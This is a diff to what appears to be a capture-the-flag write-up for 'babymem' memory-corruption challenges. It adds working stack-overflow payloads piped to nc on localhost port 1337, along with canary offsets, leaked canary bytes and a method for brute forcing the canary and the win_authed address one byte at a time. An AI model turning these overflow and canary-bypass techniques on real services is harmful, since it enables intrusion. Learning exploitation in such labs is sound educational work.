@@ -56,5 +56,11 @@
 - *babymem_level13.1*: debug the program, find the offsets, leak the flag!
 - *babymem_level14.0*: this challenge is like a combination of level 13 and 12. This time, we cannot directly pad non-zero bytes to the canary to leak it, because to do that we need to pad 377 bytes, but the program prints out our input using format string `"%.371s"`, which will print out at most 371 bytes. We can also find the value of the canary at `&buffer+216` and `&buffer+104`
 - *babymem_level14.1*: debug the program, find the offsets, leak the flag!
-- *babymem_level15.0*: we need to defeat the stack canary by utilizing a network-style fork server in the target binary
-- *babymem_level15.1*
+- *babymem_level15.0*: This challenge is listening for connections on TCP port 1337. We can use `nc` command to send data to it. 15.0 is easy as it prints out the value of the canary, and in the same run of the challenge, each connection we created uses the same value for the canary, and the address of `win_authed` is fixed
+    - `&canary=&buffer+56`
+    - `&win_authed+28=0x71e4`
+    - `canary=0x1040006c898c7200` (little endian: `00 72 8c 89 6c 00 40 10`)
+    - Initial exploit: `(echo "74"; python -c "print('a' * 56 + '\x00\x72\x8c\x89\x6c\x00\x40\x10' + 'a'*8 + '\xe4\x71')") | nc localhost 1337`. A problem here is that sending the of output `print` of python to `nc` only works for bytes less than `0x80`, e.g., if we use `python -c "print('\x81')" | nc host port`, it will actually send `0xc2 0x81`. A solution is to use `echo -e '\x81'`. So, the payload that works is: `(echo "74"; echo -e 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x00\x72\x8c\x89\x6c\x00\x40\x10aaaaaaaa\xe4\x71') | nc localhost 1337`
+- *babymem_level15.1*: we need to brute force 2 values, the address of `win_authed`, and the stack canary. Luckily, we can brute force them separately. First, the canary, to find out the canary, we can try payload with different length, until there is a `SIGABRT` (or we can do it manually with `(echo "100"; python -c "print('a'*100)" | nc localhost 1337)`, and see if there is a `*** stack smashing detected ***: terminated`). We can know that `&canary=&buffer+104`
+    - Then, we can start to brute force the canary, actually we can do this one byte a time, and the first byte is always `0x00`. We start from the second byte, i.e., use a payload of 106 bytes: `'a'*104 + '\x00\x??'`. The canary is (little endian) `\x00\na\xda\x02\x9d\xd4\x00`
+    - The address of `win_authed` is fixed in each run of the challenge, `gdb` it and we can know that `&win_authed=0x...?f4e`, we only need to try 16 cases to get the correct address
